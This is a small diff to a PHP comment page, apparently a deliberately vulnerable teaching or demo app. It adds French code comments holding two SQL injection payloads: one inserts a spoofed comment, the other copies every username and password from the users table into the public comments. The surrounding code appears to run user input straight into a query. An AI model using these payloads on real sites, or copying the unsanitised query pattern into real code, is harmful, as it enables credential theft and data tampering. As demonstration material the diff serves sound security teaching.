@@ -27,6 +27,13 @@ if(isset($_POST['comment']) && !empty($_POST['comment'])
     $pdo->query($requete);
 }
 
+// Exemple d'injection qui ajoute un commentaire supplémentaire :
+// username'; INSERT INTO comments SET username='CHEH', comment='CHEH'; --
+
+// Exemple d'injection qui dump toute la table utilisateurs (eh ouais !)
+// username'; INSERT INTO comments (username, comment) SELECT 'all_users', GROUP_CONCAT(CONCAT(username, ':', password) SEPARATOR '\n<br>') FROM utilisateurs; --
+
+
 // Récupérer tous les commentaires
 $comments = $pdo->query('SELECT * FROM comments')->fetchAll();
 }
